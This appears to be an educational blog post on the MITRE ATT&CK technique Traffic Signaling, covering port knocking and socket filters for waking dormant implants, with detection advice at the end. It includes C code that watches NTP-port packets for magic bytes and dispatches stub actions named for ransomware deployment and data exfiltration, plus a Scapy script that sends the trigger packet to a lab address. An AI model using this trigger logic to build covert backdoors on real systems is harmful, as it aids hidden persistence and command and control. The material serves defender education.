---
title: "What is Traffic Signaling?"
tags: "ATT&CK"
article_header:
  type: cover
  image:
    src: /images/mitreattack.png
cover: /images/trafficsignaling/cover.jpg
---

* Tactics: Defense Evasion, Persistence, Command & Control
* Purpose: To avoid detection when sending instructions to implants on compromised systems.

## Situation

An adversary compromises a system in a target environment and is able to execute a malicious implant. Rather than immediately beaconing out to command and control (C2) infrastructure, the adversary wants to minimize suspicious traffic to avoid detection by network monitoring defenses. One way for a backdoor to stay idle until triggered on demand is using Traffic Signaling, which involves sending a specially crafted or a combination of packets to the compromised device. 

## How it works

Packets may be sent from another compromised system, like an [internal proxy](https://attack.mitre.org/techniques/T1090/001/), or from attacker infrastructure if the implanted device is externally facing. The running process monitors inbound traffic for signals. The traffic signals may instruct the malware to do something that network defenses look for, like initiatiating a shell with C2. 

One way to monitor for incoming connections is by inspecting Netstat output periodically, but spawning a child process can be suspicious. This also limits the implant to only fully established connections without the ability to inspect the frame headers or data. If the malware has administrative priviliges, it can monitor all inbound traffic on the system using pcap libraries like `npcap` on Windows or `libpcap` on Linux or create raw sockets. This includes ports in use by other programs, allowing the signals to blend in with standard traffic like SSH, HTTP, or SMB.

### Port Knocking

One method adversaries have used to signal to the listening malware is Port Knocking, which involves sending a predefined sequence of packets to different ports on the compromised system. In the example below, a program uses `libpcap` to monitor incoming packets on the local network interface. If ten SYN packets arrive at increasing fibonacci port numbers from the the same source IP address in the span of 60 seconds, a "reverse shell" is spawned.

{% include image.html url="/images/trafficsignaling/nmap_portknocking.png" description="Two Nmap scans are initiated from another system - the first with a random Nmap scan order (default), and the second with 10 sequential fibonacci port numbers (using the -r flag)" percentage="80" %}
{% include image.html url="/images/trafficsignaling/portknocking.png" description="The implant is triggered when it detects the correct order" percentage="80" %}


### Socket Filters

Another way to send signals is by filtering for crafted packets with unusual characteristics or "magic bytes" embedded in the data. The payload may carry different signals, allowing additional control. In the following scenario, a program uses a raw socket to filter for inbound UDP packets on port 123 (NTP). When a "password" byte chunk is detected, the following ten bytes will signal which action the program should take.

~~~
// UDP port 123 packet received, checking data for signals
void check_byte_pattern(const char* udpData, int length) {
    const unsigned char passwordChunk[] = { 0x3A, 0xF1, 0xD2, 0x84, 0xB7, 0xC9, 0x5E, 0x6F, 0x12, 0xA3 };
    const int passLength = sizeof(passwordChunk);

    const unsigned char signal1[] = { 0x7B, 0x8C, 0x2D, 0x5F, 0xE6, 0x91, 0x4A, 0x0D, 0xF3, 0xC8 };
    const unsigned char signal2[] = { 0x1E, 0xA7, 0x9B, 0x05, 0xD4, 0x8F, 0x36, 0xC2, 0x7D, 0xE9 };
    const unsigned char signal3[] = { 0x52, 0xF8, 0x3C, 0x6B, 0x94, 0x0A, 0xE1, 0xD7, 0x2F, 0x8E };

    // Search every 10 byte chunk in the UDP data
    for (int i = 0; i <= length - passLength; i++) {
        // If the 10 byte chunk matches the passwordChunk
        if (memcmp(udpData + i, passwordChunk, passLength) == 0) {
            // If there are at least 10 more bytes after the target pattern
            if (i + passLength + 10 <= length) {
                printf("  Signal detected: ");
                print_hex(passwordChunk, passLength);

                printf("  Next ten bytes: ");
                print_hex((const unsigned char*)(udpData + i + passLength), 10);

                if (memcmp(udpData + i + passLength, signal1, 10) == 0) {
                    clean_presence();
                }
                else if (memcmp(udpData + i + passLength, signal2, 10) == 0) {
                    deploy_ransomware();
                }
                else if (memcmp(udpData + i + passLength, signal3, 10) == 0) {
                    exfiltrate_data();
                }
            }
            break;
        }
    }
}
~~~
{: .language-c}

The following Python script sends a UDP packet with the byte combo needed to trigger the `exfiltrate_data` method.

~~~
from scapy.all import IP, UDP, Raw, send
import random

target_ip = "192.168.56.1"
target_port = 123

payload = bytes([
    0x3A, 0xF1, 0xD2, 0x84, 0xB7, 0xC9, 0x5E, 0x6F, 0x12, 0xA3,
    0x52, 0xF8, 0x3C, 0x6B, 0x94, 0x0A, 0xE1, 0xD7, 0x2F, 0x8E
])

prefix = bytes([random.randint(0, 255) for _ in range(random.randint(10, 20))])
suffix = bytes([random.randint(0, 255) for _ in range(random.randint(10, 20))])
final_payload = prefix + payload + suffix

packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=final_payload)
send(packet, verbose=1)
~~~
{: .language-python}

{% include image.html url="/images/trafficsignaling/socket_filter.png" description="Socket filter received signal to exfiltrate data" percentage="80" %}

### Detective Measures

Monitor network traffic for abnormal connection combinations that do not follow standard flow patterns. Behavioral analytics solutions and stateful firewalls can perform some of this analysis. Create detections around malformed packets that do not conform to their destination port's application protocol structure, or packets that originate from the wrong source port (such as NTP datagrams that are not both to and from port 123). This may assist in finding covert signals attempting to blend in.

Alert on untrusted programs that create raw sockets (`AF_INET`,`SOCK_RAW`) or use packet filter libraries. On Windows, detect NDIS (Network Driver Interface Specification) driver installations using the `Get-NetAdapterBinding` PowerShell Cmdlet and monitor for `PF_PACKET` sockets on Linux.

## References

- [MITRE ATT&CK - Traffic Signaling](https://attack.mitre.org/techniques/T1205/)
- [MITRE ATT&CK - Port Knocking](https://attack.mitre.org/techniques/T1205/001/)
- [MITRE ATT&CK - Socket Filters](https://attack.mitre.org/techniques/T1205/002/)